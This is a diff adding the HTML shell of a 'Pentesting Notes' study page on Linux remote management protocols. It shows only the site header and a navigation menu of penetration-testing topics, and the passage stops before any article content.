@@ -1,0 +1,4466 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../Enumeration%20Principles/">
+      
+      
+        <link rel="next" href="../Oracle%20-%20TNS%20Transparent%20Network%20Substate/">
+      
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.5">
+    
+    
+      
+        <title>Linux Remote Management Protocols - Pentesting Notes</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.8608ea7d.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../styles/custom.css">
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="#00be98" data-md-color-accent="#007e65">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#references" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../.." title="Pentesting Notes" class="md-header__button md-logo" aria-label="Pentesting Notes" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Pentesting Notes
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Linux Remote Management Protocols
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="#00be98" data-md-color-accent="#007e65"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6m0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4M7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="#00be98" data-md-color-accent="#007e65"  aria-label="switch to light mdoe"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="switch to light mdoe" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="Pentesting Notes" class="md-nav__button md-logo" aria-label="Pentesting Notes" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Pentesting Notes
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Welcome to My Portfolio
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    CPTS
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            CPTS
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_1" id="__nav_2_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Getting Started
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            Getting Started
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Getting%20Started/Web%20Enumeration%20Overview/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Web Enumeration Overview
+    
+  </span>
+  
+    
+  
+  
+    <span class="md-status md-status--['Completed']"></span>
+  
+
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Getting%20Started/Types%20of%20Shells/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Types of Shells
+    
+  </span>
+  
+    
+  
+  
+    <span class="md-status md-status--['Completed']"></span>
+  
+
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Getting%20Started/Folder%20Structure/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Folder Structure
+    
+  </span>
+  
+    
+  
+  
+    <span class="md-status md-status--['In-Progress']"></span>
+  
+
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Getting%20Started/Public%20Exploits/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Public Exploits
+    
+  </span>
+  
+    
+  
+  
+    <span class="md-status md-status--['Completed']"></span>
+  
+
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Getting%20Started/Get%20OS%20Information/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Get OS Information
+    
+  </span>
+  
+    
+  
+  
+    <span class="md-status md-status--['Completed']"></span>
+  
+
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Getting%20Started/Way%20Forward/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Way Forward
+    
+  </span>
+  
+    
+  
+  
+    <span class="md-status md-status--['in-progress']"></span>
+  
+
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Getting%20Started/Starting%20Out/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Starting Out
+    
+  </span>
+  
+    
+  
+  
+    <span class="md-status md-status--['Completed']"></span>
+  
+
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Getting%20Started/Common%20Pitfalls%20and%20Troubleshooting%20in%20VPN%20and%20SSH%20Connections/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Common Pitfalls and Troubleshooting in VPN and SSH Connections
+    
+  </span>
+  
+    
+  
+  
+    <span class="md-status md-status--['Completed']"></span>
+  
+
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Getting%20Started/Transferring%20Files/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Transferring Files
+    
+  </span>
+  
+    
+  
+  
+    <span class="md-status md-status--['in-progress']"></span>
+  
+
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    File Transfers
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            File Transfers
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../File%20Transfers/Win%20File%20Transfer%20Methods/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Win File Transfer Methods
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../File%20Transfers/Linux%20File%20Transfer%20Methods/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Linux File Transfer Methods
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../File%20Transfers/file_transfer_operations/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    File transfer operations
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../File%20Transfers/transfer_files_wtih_code/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Transferring Files with Code
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../File%20Transfers/miscellaneous_file_transfer/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Miscellaneous file transfer
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../File%20Transfers/protected_file_transfer/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Protected file transfer
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../File%20Transfers/catching_files_over_HTTPS/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    catching files over HTTPS
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../File%20Transfers/detection/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Detection
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../File%20Transfers/living_off_the_land/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Living off the land
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../File%20Transfers/evasion_detection/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Evasion detection
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Shells and Payloads
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            Shells and Payloads
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Shells%20and%20Payloads/understanding_shells_and_payloads/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Understanding Shells and Payloads
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Shells%20and%20Payloads/CAT5/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    CAT5 Security's Engagement Preparation
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Shells%20and%20Payloads/anatomy_of_a_shell/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Anatomy of a shell
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Shells%20and%20Payloads/bind_shell/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Bind shell
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Shells%20and%20Payloads/reverseshell/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Reverseshell
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Shells%20and%20Payloads/Payloads/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Payloads
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Shells%20and%20Payloads/Infiltrating-Unix-Linux/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Infiltrating Unix Linux
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Shells%20and%20Payloads/SpawningInteractiveShells/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SpawningInteractiveShells
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Shells%20and%20Payloads/Laudanum%2C%20One%20Webshell%20to%20Rule%20Them%20All/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Laudanum, One Webshell to Rule Them All
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Shells%20and%20Payloads/skillAssessment/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    skillAssessment
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Shells%20and%20Payloads/DetectionAndPrevention/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Detection &amp; Prevention Summary
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_4" id="__nav_2_4_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Metasploit
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_4">
+            <span class="md-nav__icon md-icon"></span>
+            Metasploit
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Metasploit/Preface/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Preface
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_5" id="__nav_2_5_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Tools
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_5">
+            <span class="md-nav__icon md-icon"></span>
+            Tools
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tools/onesixtyone/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    onesixtyone
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tools/Braa/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Braa
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tools/WinRM/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    WinRM
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tools/Shodan/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Shodan
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tools/xfreerdp/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Xfreerdp
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tools/Nessus/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Nessus
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tools/Metasploit/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Metasploit
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tools/Nikto/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Nikto
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tools/Rsync/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Rsync
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tools/snmpwalk/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    snmpwalk
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tools/Windows_Management_Instrumentation/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Windows Management Instrumentation
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tools/vnStat/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    vnStat
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tools/DNSenum/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    DNSenum
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tools/OpenVAS/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    OpenVAS
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tools/File%20Transfer%20tools/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    File Transfer tools
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tools/JtR/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    John the Ripper (JtR) Comprehensive Guide
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tools/Certutil/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Certutil
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tools/ssti/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    A Pentester's Guide to Server-Side Template Injection (SSTI)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tools/Powershell/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Powershell
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_6" id="__nav_2_6_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Nmap
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_6">
+            <span class="md-nav__icon md-icon"></span>
+            Nmap
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Nmap/Firewall%20and%20IDS%20IPS%20Evasion/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Firewall and IDS IPS Evasion
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Nmap/Nmap/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Nmap
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Nmap/Service%20Enumeration/" class="md-nav__link">
+        
+  
